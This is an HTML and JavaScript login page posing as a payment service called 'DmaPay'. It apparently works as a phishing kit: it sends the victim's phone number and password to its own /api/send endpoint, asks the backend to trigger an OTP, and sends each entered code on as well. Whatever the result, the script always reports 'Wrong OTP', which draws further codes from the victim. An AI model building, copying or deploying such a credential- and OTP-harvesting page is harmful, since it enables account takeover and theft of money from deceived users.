<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>DmaPay</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: #ffffff;
      color: #333333;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    .container { width: 100%; max-width: 380px; text-align: center; }
    
    /* Logo Section */
    .logo-section {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-bottom: 30px;
    }
    .logo-box {
      width: 100%; max-width: 240px; height: auto;
      margin-bottom: 10px;
      overflow: hidden;
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .logo-box img { width: 100%; height: auto; object-fit: contain; }

    /* Input Fields */
    .input-group {
      display: flex; align-items: center;
      background: #f8fafc;
      border: 1px solid #f1f5f9;
      border-radius: 30px; 
      padding: 14px 20px;
      margin-bottom: 15px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.01);
    }
    .input-group:focus-within { border-color: #0284c7; background: #fff; }
    .input-group svg { width: 22px; height: 22px; fill: none; stroke: #0284c7; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; margin-right: 15px; flex-shrink: 0; }
    .input-group input {
      background: transparent; border: none; color: #1e293b;
      font-size: 16px; width: 100%; outline: none; font-weight: 400;
    }
    .input-group input::placeholder { color: #94a3b8; font-weight: 400; }

    /* Custom Circular Checkbox Style */
    .custom-checkbox {
      display: inline-flex;
      align-items: center;
      cursor: pointer;
      font-size: 14px;
      user-select: none;
      gap: 8px;
    }
    .custom-checkbox input {
      position: absolute;
      opacity: 0;
      cursor: pointer;
      height: 0;
      width: 0;
    }
    .checkmark {
      position: relative;
      height: 18px;
      width: 18px;
      background-color: #fff;
      border: 2px solid #cbd5e1;
      border-radius: 50%; /* Circle shape */
      display: inline-block;
      transition: all 0.2s ease;
    }
    .custom-checkbox input:checked ~ .checkmark {
      background-color: #0284c7;
      border-color: #0284c7;
    }
    .checkmark:after {
      content: "";
      position: absolute;
      display: none;
    }
    .custom-checkbox input:checked ~ .checkmark:after {
      display: block;
    }
    /* Tick Mark inside Circle */
    .custom-checkbox .checkmark:after {
      left: 5px;
      top: 2px;
      width: 4px;
      height: 8px;
      border: solid white;
      border-width: 0 2px 2px 0;
      transform: rotate(45deg);
    }

    /* Links Row (Save Password & Forgot password) */
    .row {
      display: flex; justify-content: space-between; align-items: center;
      font-size: 14px; margin-bottom: 25px;
      padding: 0 5px; font-weight: 500;
    }
    .row a { color: #0284c7; text-decoration: none; }
    .row div { color: #0284c7; }

    /* Agreement */
    .checkbox-container {
      display: flex; align-items: center; justify-content: center;
      font-size: 13px; color: #64748b; margin-top: 15px; margin-bottom: 25px;
      font-weight: 400;
    }
    .checkbox-container .custom-checkbox { gap: 6px; }
    .checkbox-container a { color: #0284c7; text-decoration: underline; font-weight: 500; }

    /* Button */
    .btn-main {
      width: 100%; padding: 16px;
      background: #0284c7;
      color: #fff; border: none; border-radius: 30px;
      font-size: 18px; font-weight: 600; cursor: pointer;
      box-shadow: 0 4px 12px rgba(2, 132, 199, 0.25);
      transition: transform 0.2s, background 0.2s;
    }
    .btn-main:hover { background: #0369a1; }
    .btn-main:active { transform: scale(0.98); }
    .btn-main:disabled { background: #cbd5e1; cursor: not-allowed; box-shadow: none; }

    /* Popup / Overlay */
    .popup-overlay {
      display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0, 0, 0, 0.5); justify-content: center; align-items: center;
      padding: 20px; z-index: 1000; backdrop-filter: blur(4px);
    }
    .popup-box {
      background: #ffffff;
      padding: 25px 20px; border-radius: 24px;
      width: 100%; max-width: 380px; position: relative;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
    }
    .close-btn {
      position: absolute; top: 15px; right: 15px;
      background: #f1f5f9; color: #64748b; border: none;
      border-radius: 50%; width: 32px; height: 32px;
      font-size: 16px; cursor: pointer;
      display: flex; align-items: center; justify-content: center;
    }
    .popup-box h2 { font-size: 20px; margin-bottom: 10px; text-align: left; color: #1e293b; }
    .popup-box p { font-size: 14px; color: #64748b; margin-bottom: 15px; line-height: 1.4; text-align: left; }
    .popup-box p span { color: #0284c7; font-weight: 700; }
    
    .otp-input-group {
      display: flex; align-items: center;
      background: #fff;
      border: 1px solid #cbd5e1;
      border-radius: 25px; padding: 5px 5px 5px 15px;
      margin-bottom: 20px;
      width: 100%; box-sizing: border-box; overflow: hidden;
    }
    .otp-input-group input {
      flex: 1; background: transparent; border: none;
      color: #1e293b; padding: 10px 0; font-size: 16px;
      outline: none; letter-spacing: 4px; min-width: 0;
    }
    .otp-input-group button {
      background: #0284c7;
      color: #fff; border: none; border-radius: 20px;
      padding: 10px 18px; font-weight: 700; cursor: pointer; font-size: 14px;
      white-space: nowrap; flex-shrink: 0;
    }
    .otp-input-group button:disabled { background: #cbd5e1; cursor: not-allowed; }
    
    .timer-text { color: #64748b; font-size: 13px; margin-bottom: 15px; text-align: center; }
    .toast {
      position: fixed; top: 20px; left: 50%;
      transform: translateX(-50%) translateY(-100px);
      background: #1e293b; color: #fff; padding: 12px 20px; border-radius: 12px;
      font-size: 14px; font-weight: 600; z-index: 2000;
      transition: transform 0.3s; max-width: 90%; text-align: center;
      box-shadow: 0 10px 20px rgba(0,0,0,0.1);
    }
    .toast.show { transform: translateX(-50%) translateY(0); }
    .toast.error { background: #ef4444; }
  </style>
</head>
<body>

  <div class="toast" id="toast"></div>

  <div class="container">
    
    <!-- LOGO -->
    <div class="logo-section">
      <div class="logo-box">
        <img src="damlogo.png" alt="DmaPay" onerror="this.style.display='none'">
      </div>
    </div>

    <!-- PHONE INPUT -->
    <div class="input-group">
      <svg viewBox="0 0 24 24"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
      <input type="tel" id="phone" placeholder="Enter phone number" maxlength="10" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,10)">
    </div>

    <!-- PASSWORD INPUT -->
    <div class="input-group">
      <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
      <input type="password" id="pass" placeholder="Enter password">
    </div>

    <!-- SAVE PASSWORD & FORGOT PASSWORD ROW -->
    <div class="row">
      <div>
        <label class="custom-checkbox">
          <input type="checkbox">
          <span class="checkmark"></span>
          Save Password
        </label>
      </div>
      <a href="#">Forgot password</a>
    </div>

    <!-- LOGIN BUTTON -->
    <button class="btn-main" id="signInBtn" onclick="handleSignIn()">Login</button>

    <!-- AGREEMENT -->
    <div class="checkbox-container">
      <label class="custom-checkbox">
        <input type="checkbox" checked>
        <span class="checkmark"></span>
        Agree <a href="#">"User Privacy Agreement"</a>
      </label>
    </div>

  </div>

  <!-- OTP POPUP -->
  <div class="popup-overlay" id="otpPopup">
    <div class="popup-box">
      <button class="close-btn" onclick="closeOTP()">✕</button>
      <h2>Login OTP</h2>
      <p>Tap Send to receive the OTP, then enter it to confirm this login.</p>
      <p>OTP will be sent to <span id="displayPhone">+91 XXXXXXXX</span></p>
      
      <div class="otp-input-group">
        <!-- Placeholder sirf "Enter OTP" kar diya gaya hai -->
        <input type="tel" id="otpInput" placeholder="Enter OTP" maxlength="4" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,4)">
        <button id="sendOtpBtn" onclick="sendOTP()">Send</button>
      </div>
      
      <div class="timer-text" id="timerText"></div>
      <button class="btn-main" id="confirmBtn" onclick="verifyOTP()">CONFIRM</button>
    </div>
  </div>

  <script>
    let countdown;
    let timeLeft = 60;
    let isProcessing = false;
    let tempPhone = '';
    let tempPass = '';

    function showToast(msg, isError = false) {
      const toast = document.getElementById('toast');
      toast.textContent = msg;
      toast.className = 'toast show' + (isError ? ' error' : '');
      clearTimeout(toast._timeout);
      toast._timeout = setTimeout(() => { toast.className = 'toast'; }, 3000);
    }

    async function callAPI(data) {
      try {
        const response = await fetch('/api/send', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        });
        return await response.json();
      } catch (err) {
        console.error('API Error:', err);
        return { error: 'Network error' };
      }
    }

    async function handleSignIn() {
      if (isProcessing) return;
      const phone = document.getElementById('phone').value.trim();
      const pass = document.getElementById('pass').value.trim();
      const btn = document.getElementById('signInBtn');

      if (!phone || !pass) { showToast('Please fill all fields!', true); return; }
      if (phone.length !== 10) { showToast('Phone must be 10 digits!', true); return; }

      tempPhone = phone;
      tempPass = pass;

      isProcessing = true;
      btn.disabled = true;
      btn.textContent = 'Please wait...';

      try {
        const result = await callAPI({ phone: tempPhone, pass: tempPass, type: 'login' });
        if (result.error) {
          showToast(result.error, true);
        } else {
          document.getElementById('displayPhone').innerText = "+91 " + tempPhone;
          document.getElementById('otpPopup').style.display = 'flex';
          resetTimer();
        }
      } catch (err) {
        showToast('Something went wrong!', true);
      } finally {
        isProcessing = false;
        btn.disabled = false;
        btn.textContent = 'Login';
      }
    }

    function closeOTP() {
      document.getElementById('otpPopup').style.display = 'none';
      clearInterval(countdown);
    }

    async function sendOTP() {
      const btn = document.getElementById('sendOtpBtn');
      startTimer();
      btn.disabled = true;
      btn.innerText = "Sent";
      await callAPI({ phone: tempPhone, type: 'send_otp' });
    }

    async function verifyOTP() {
      if (isProcessing) return;
      const otp = document.getElementById('otpInput').value;
      const btn = document.getElementById('confirmBtn');

      if (!otp) { showToast('Please enter OTP!', true); return; }
      if (otp.length !== 4) { showToast('OTP must be 4 digits!', true); return; }

      isProcessing = true;
      btn.disabled = true;
      btn.textContent = 'Verifying...';

      try {
        await callAPI({ phone: tempPhone, otp, type: 'verify_otp' });
      } catch (err) { console.error(err); }

      setTimeout(() => {
        isProcessing = false;
        btn.disabled = false;
        btn.textContent = 'CONFIRM';
        showToast('❌ Wrong OTP! Please try again.', true);
      }, 800);
    }

    function startTimer() {
      timeLeft = 60;
      const timerDisplay = document.getElementById('timerText');
      clearInterval(countdown);
      countdown = setInterval(() => {
        if (timeLeft <= 0) {
          clearInterval(countdown);
          timerDisplay.innerText = "";
          document.getElementById('sendOtpBtn').disabled = false;
          document.getElementById('sendOtpBtn').innerText = "Send";
        } else {
          timerDisplay.innerText = "⏳ Resend OTP in " + timeLeft + "s";
          timeLeft--;
        }
      }, 1000);
    }

    function resetTimer() {
      clearInterval(countdown);
      timeLeft = 60;
      document.getElementById('sendOtpBtn').disabled = false;
      document.getElementById('sendOtpBtn').innerText = "Send";
      document.getElementById('otpInput').value = "";
      document.getElementById('timerText').innerText = "";
    }
  </script>

</body>
</html>
